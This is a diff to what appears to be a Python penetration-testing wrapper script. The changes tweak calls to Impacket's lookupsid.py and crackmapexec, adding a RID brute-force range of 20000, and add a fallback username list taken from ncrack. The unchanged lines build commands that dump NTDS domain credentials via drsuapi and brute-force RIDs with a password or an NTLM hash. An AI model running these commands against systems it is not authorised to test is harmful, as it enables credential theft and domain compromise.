@@ -1474,6 +1474,7 @@ while True:
          SID = spacePadding(SID, COL1)
       else:
          SID = BAK
+      prompt()
          
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1930,7 +1931,7 @@ while True:
          checkParam = test_DOM()               
       if checkParam != 1:
          print(colored("[*] Enumerating, please wait....", colour3))
-         remoteCOM(keyPath + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " > domain.tmp")                  
+         remoteCOM(keyPath + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " 20000 > domain.tmp")                  
          localCOM("cat domain.tmp | grep 'Domain SID' > sid.tmp")         
          with open("sid.tmp", "r") as read:
             line1 =  read.readline()            
@@ -2836,7 +2837,7 @@ while True:
                print("\n[+] Enumerating NTDS...\n")
                remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --ntds drsuapi")
                print("\n[+] Performing rid brute...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --rid-brute")               
+               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --rid-brute 20000")               
          else:
             print("[i] Using HASH value as password credential...")
             checkParam = test_PRT("5985")
@@ -2858,7 +2859,7 @@ while True:
                print("\n[+] Enumerating NTDS...\n")
                remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --local-auth --ntds drsuapi")
                print("\n[+] Performing rid brute...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --rid-brute")
+               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --rid-brute 20000")
       print("KNOWN CODING ERROR _ CRACKMAPEXEC EOF TERMINATION")         
       prompt()
                
@@ -3399,7 +3400,11 @@ while True:
             localCOM("cat /usr/share/ncrack/minimal.usr >> " + dataDir + "/usernames.txt 2>&1")
             cutLine("# minimal list of very", dataDir + "/usernames.txt")
             print("[+] Username list generated via /usr/share/ncrack/minimal.usr...")
-
+      else:
+            localCOM("cat /usr/share/ncrack/minimal.usr >> " + dataDir + "/usernames.txt 2>&1")
+            cutLine("# minimal list of very", dataDir + "/usernames.txt")
+            print("[+] Username list generated via /usr/share/ncrack/minimal.usr...")
+      
       for x in range (0, maxUser):
          USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
          USER[x] = spacePadding(USER[x], COL3)         
